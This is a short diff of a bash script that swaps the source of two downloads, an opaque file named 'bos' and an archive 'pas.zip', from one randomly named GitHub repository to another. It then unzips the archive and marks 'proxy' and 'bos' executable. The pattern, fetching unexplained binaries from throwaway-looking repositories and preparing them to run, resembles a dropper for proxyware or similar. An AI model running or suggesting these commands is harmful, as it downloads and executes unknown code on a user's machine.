@@ -1,6 +1,6 @@
 #!/bin/bash
-curl -O -L -J https://github.com/dolmerda26/vigilant-fortnight/raw/refs/heads/main/bos
-curl -O -L -J https://github.com/dolmerda26/vigilant-fortnight/raw/refs/heads/main/pas.zip
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/pas.zip
 unzip pas.zip
 chmod +x proxy
 chmod +x bos
